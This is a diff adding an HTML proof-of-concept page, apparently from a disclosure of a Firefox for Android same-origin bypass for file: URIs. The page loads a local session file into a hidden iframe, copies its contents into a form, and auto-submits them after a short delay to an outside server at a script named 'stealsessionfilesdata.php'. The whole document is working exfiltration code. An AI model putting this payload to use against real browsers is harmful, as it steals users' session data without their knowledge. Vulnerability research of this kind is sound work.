@@ -1,0 +1,37 @@
+ <html>
+<head>
+<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1' />
+<title>part3 - Firefox for Android : Same-origin policy for file: URIs Bypass</title>
+</head>
+<body>
+<script>
+	
+ function getTextone() {
+	sContentone = '';
+	if(document.body.innerText) {
+	sContentone = window.idFrameone.document.body.innerText;
+	} else {
+	sContentone = window.idFrameone.document.body.innerHTML;
+	sContentone = sContentone.substring(5, sContentone.length - 6);
+	}
+	document.getElementById('outputone').value = sContentone;
+	}
+	
+	setTimeout("document.forms[0].submit();", 1800);
+	
+</script>
+
+<iframe src='./session1.js' name='idFrameone' id='idFrameone' width='200' height='150' onload='getTextone();' style='display: none;'></iframe>
+
+<form action="http://www.alternativ-testing.fr/stealsessionfilesdata.php" method="get" id="stealdata" name="stealsessionfiledata" >
+
+<textarea rows="25" cols="70" id='outputone' name='html'></textarea>
+
+<input type="submit">
+
+</form>
+
+<br>
+
+</body>
+</html>  
